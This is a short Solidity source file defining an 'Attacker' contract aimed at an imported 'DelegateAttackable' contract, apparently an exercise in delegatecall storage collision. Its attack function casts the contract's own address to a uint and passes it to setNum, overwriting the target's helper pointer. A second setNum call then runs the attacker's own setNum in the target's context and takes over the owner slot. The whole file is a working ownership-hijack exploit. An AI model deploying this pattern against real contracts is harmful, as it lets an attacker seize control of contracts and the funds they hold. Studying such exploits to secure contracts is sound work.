// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import "./delegateAttackable.sol";

contract Attacker {
    address public helper;
    address public owner;
    uint public num;

    DelegateAttackable public delegateAttackable;

    constructor(DelegateAttackable _address){
        delegateAttackable = DelegateAttackable(_address);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // type casts address to uint
        delegateAttackable.setNum(uint(uint160(address(this))));
        delegateAttackable.setNum(1);
    }

}